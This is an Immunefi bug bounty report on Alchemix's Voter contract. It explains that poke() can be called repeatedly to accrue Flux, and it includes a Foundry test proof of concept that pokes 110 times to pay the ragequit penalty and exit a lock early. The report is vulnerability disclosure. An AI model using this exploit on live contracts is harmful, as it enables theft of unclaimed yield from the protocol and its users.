# 30906 - \[SC - Critical] Voterpoke can be called at will leading to a us...

Submitted on May 7th 2024 at 21:34:31 UTC by @dirtymic for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30906

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

After a user votes, they can call poke however many times they want. This accrues Flux each time it recasts their vote. Giving them access to either Ragequit and withdraw early or leave the unclaimed flux and max boost their future votes, as well as walk away with leftover Flux tokens.

## Vulnerability Details

Once a user votes, they cannot vote again until the next epoch. However `Voter.poke()` can be called at any time. In the `poke` function `_vote` is called.

In `_vote` there is a call to the flux token contract that accrues unclaimed Flux.

```
...
    _reset(_tokenId);

        uint256 _poolCnt = _poolVote.length;
        uint256 _totalVoteWeight = 0;
        uint256 _totalWeight = 0;

        for (uint256 i = 0; i < _poolCnt; i++) {
            _totalVoteWeight += _weights[i];
        }

        IFluxToken(FLUX).accrueFlux(_tokenId);
...
```

This accrues the unclaimed Flux balance of the \_tokenId by the amount of `claimableFlux` received from the VotingEscrow\.sol contract

```
function claimableFlux(uint256 _tokenId) public view returns (uint256) {
        // If the lock is expired, no flux is claimable at the current epoch
        if (block.timestamp > locked[_tokenId].end) {
            return 0;
        }

        // Amount of flux claimable is <fluxPerVeALCX> percent of the balance
        return (_balanceOfTokenAt(_tokenId, block.timestamp) * fluxPerVeALCX) / BPS;
    }
```

Poke can be called at whim after a user has voted allowing a user to accrue Flux whenever they want. The amount of Flux accrued grows in proportion to the balance of veALCX of a tokenId.

## Impact Details

A user can accrue Flux at an abnormal rate using `poke()`, this allows a user to exit from a lock within 1 epoch by calling `poke()` enough times to accrue a large enough balance to pay the Ragequit penalty. If a user were to create a lock with 1 token, vote, and then call poke 110 times. They would have enough Flux to pay the penalty and walk away with 7.5 Flux tokens.

A user also has the option to leave the unclaimed Flux and use it to max boost their future votes.

## References

Poke: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L194-L212> \_vote: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L412-L455> accrueFlux: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/FluxToken.sol#L187-L192> claimableFlux: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L376-L385>

## Proof of Concept

This was written in the provided Voting.t.sol

```
function testVoteAndPoke() public {
        uint256 tokenId = createVeAlcx(admin, TOKEN_1, MAXTIME, false);

        hevm.startPrank(admin);

        hevm.warp(block.timestamp + nextEpoch);

        address[] memory pools = new address[](1);
        pools[0] = alETHPool;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        voter.vote(tokenId, pools, weights, 0);

        for (uint i = 0; i < 110; i++) {
            voter.poke(tokenId);
        }

        address[] memory poolVote = voter.getPoolVote(tokenId);
        assertEq(poolVote[0], alETHPool);

        uint256 penaltyAmount = veALCX.amountToRagequit(tokenId);

        flux.claimFlux(tokenId, penaltyAmount);

        flux.approve(address(veALCX), penaltyAmount);

        veALCX.startCooldown(tokenId);

        hevm.warp(block.timestamp + nextEpoch);

        voter.reset(tokenId);

        uint256 flux1 = flux.unclaimedFlux(tokenId);

        veALCX.withdraw(tokenId);

        uint256 fluxBalanceAfter = flux.balanceOf(admin);

        assertEq(fluxBalanceAfter, flux1);

        emit Message("Admin balance after withdraw", IERC20(bpt).balanceOf(admin));

    }
```
